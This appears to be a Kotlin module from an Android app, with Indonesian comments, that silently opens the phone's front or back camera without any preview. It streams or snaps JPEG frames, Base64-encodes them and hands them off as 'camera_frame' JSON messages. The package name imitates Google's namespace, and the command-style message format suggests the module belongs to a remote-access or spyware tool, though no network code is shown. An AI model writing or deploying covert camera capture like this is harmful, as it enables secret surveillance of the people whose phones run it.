package com.google.modsuki

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import androidx.core.content.ContextCompat
import org.json.JSONObject

object CameraStreamer {
    private var dev: CameraDevice? = null
    private var sess: CameraCaptureSession? = null
    private var read: ImageReader? = null
    private var th: HandlerThread? = null
    private var isLiveMode = false
    private var isRunning = false

    fun start(ctx: Context, facing: Int, isLive: Boolean, emit: (JSONObject) -> Unit) {
        try {
            // 1. CEK IZIN KAMERA (Penyebab utama ga muncul)
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                emit(JSONObject().put("action", "camera_frame").put("error", "Izin kamera ditolak."))
                return
            }

            // 2. STOP STREAM LAMA (Biar ga tabrakan resource)
            stop()
            isLiveMode = isLive
            isRunning = true

            val m = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var targetId: String? = null
            for (id in m.cameraIdList) {
                val chars = m.getCameraCharacteristics(id)
                if (chars.get(CameraCharacteristics.LENS_FACING) == facing) {
                    targetId = id
                    break
                }
            }
            
            if (targetId == null) {
                emit(JSONObject().put("action", "camera_frame").put("error", "Kamera tidak ditemukan"))
                return
            }
            
            th = HandlerThread("cam_thread").also { it.start() }
            val h = Handler(th!!.looper)
            
            // 480x360 Ringan buat Base64
            read = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 2)
            read!!.setOnImageAvailableListener({ r ->
                if (!isRunning) return@setOnImageAvailableListener
                try {
                    val i = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val b = ByteArray(i.planes[0].buffer.remaining())
                    i.planes[0].buffer.get(b)
                    i.close()
                    
                    val payload = JSONObject()
                    payload.put("action", "camera_frame")
                    payload.put("data", Base64.encodeToString(b, Base64.NO_WRAP))
                    emit(payload)
                    
                    // Kalau mode foto, matikan stream setelah frame pertama
                    if (!isLiveMode) {
                        Handler(android.os.Looper.getMainLooper()).postDelayed({ stop() }, 500)
                    }
                } catch (e: Exception) { }
            }, h)
            
            m.openCamera(targetId, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) {
                    try {
                        dev = c
                        val r = c.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        r.addTarget(read!!.surface)
                        
                        c.createCaptureSession(listOf(read!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                try {
                                    sess = s
                                    if (isLiveMode) {
                                        // LIVE: Ambil frame terus-terusan TANPA Thread.sleep!
                                        s.setRepeatingRequest(r.build(), null, h)
                                    } else {
                                        // FOTO: Ambil 1 frame aja
                                        s.capture(r.build(), null, h)
                                    }
                                } catch (e: Exception) { 
                                    emit(JSONObject().put("action", "camera_frame").put("error", "Gagal konfigurasi"))
                                    stop()
                                }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                emit(JSONObject().put("action", "camera_frame").put("error", "Konfigurasi gagal"))
                                stop()
                            }
                        }, h)
                    } catch (e: Exception) { }
                }
                
                override fun onDisconnected(c: CameraDevice) { stop() }
                
                override fun onError(c: CameraDevice, e: Int) {
                    emit(JSONObject().put("action", "camera_frame").put("error", "Error Kamera: $e"))
                    stop()
                }
            }, h)
            
        } catch (e: Exception) {
            emit(JSONObject().put("action", "camera_frame").put("error", e.message ?: "Error"))
            stop()
        }
    }
    
    fun stop() {
        isRunning = false
        isLiveMode = false
        try {
            sess?.stopRepeating()
            sess?.close()
            sess = null
            dev?.close()
            dev = null
            read?.close()
            read = null
            th?.quitSafely()
            th = null
        } catch (e: Exception) { }
    }
}
